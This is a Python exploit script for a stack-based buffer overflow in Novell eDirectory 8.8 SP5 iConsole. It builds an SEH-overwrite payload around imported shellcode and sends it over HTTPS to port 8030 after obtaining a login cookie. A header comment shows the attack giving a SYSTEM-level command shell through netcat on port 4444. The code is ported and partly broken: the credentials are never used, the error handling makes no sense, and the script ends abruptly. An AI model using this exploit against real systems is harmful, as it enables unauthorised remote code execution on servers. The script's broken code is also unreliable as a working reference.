#!/usr/bin/python
# Novell eDirectory 8.8 SP5 iConsole BOF
# Vulnerability found by Hellcode Labs, 
# Original POC http://downloads.securityfocus.com/vulnerabilities/exploits/36815.pl
# 
# Exploit coded by Matteo Memelli | ryujin __A-T__ offensive-security.com
# www.offensive-security.com
# Spaghetti & Pwnsauce - 04/11/2009 
#
# Process dhost.exe becomes unstable after pwnage, so we need to connect quickly to save our shell ;)
#
# root@bt:~# ./gotohell.py 172.16.30.201;nc -v 172.16.30.201 4444
# 302 Found
# DHAC1=c8280012; Path=/
# 172.16.30.201: inverse host lookup failed: Unknown server error : Connection timed out
# (UNKNOWN) [172.16.30.201] 4444 (?) open
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.
# 
# C:\Novell\NDS\DIBFiles>whoami
# whoami
# nt authority\system
# 
# C:\Novell\NDS\DIBFiles>
 

import sys
import http.client, urllib
import urllib.parse
from payload import buf
import socket
import struct
def shell_attack(target_machine, target_port): 
  

   ## PUT YOUR CREDENTIALS HERE ##
   usr = b".Admin.O=offsec.OFFSEC."
   pwd = b"admin"
   ###############################
   j1  = b"\xEB\x06\x90\x90"
   j2  = b"\xE9\x26\xFD\xFF\xFF"
   n1  = b"\x90"*8
   n2  = b"\x90"*4
   p1  = b"\x41"*947
   p2  = b"\x42"*221
   ret = b"\x6A\x38\x81\x64" # 0x6481386A nmasldap.dll SafeSEH unprotected
   evil = p1 + n1 + buf + j1 + ret + n2 + j2 + p2
   # sweet biscuit...
   cookie = do_auth(usr, pwd,target_machine)
   # sh...
   do_pwn(evil, cookie,target_machine)
  
def do_auth(usr, pwd,target_machine):
   try:
      HOST = target_machine
   except IndexError:
      print("Usage: %s HOST")

 
   conn = http.client.HTTPSConnection("%s:8030" % HOST)
   conn.request(b"POST", b"/_LOGIN_SERVER_RSP_")
   response = conn.getresponse()
   cookie=response.getheaders()[1][1]
   
   data = response.read()
   conn.close()
   
   return cookie

def do_pwn(evil, cookie,HOST):
   headers = {"Host": "%s:8030" % HOST,
            "Cookie": "%s" % cookie}
   conn = http.client.HTTPSConnection("%s:8030" % HOST)
   conn.request("GET", "/dhost/modules?L:"+evil)

   # [*] Using Msf::Encoder::PexAlphaNum with final size of 709 bytes
  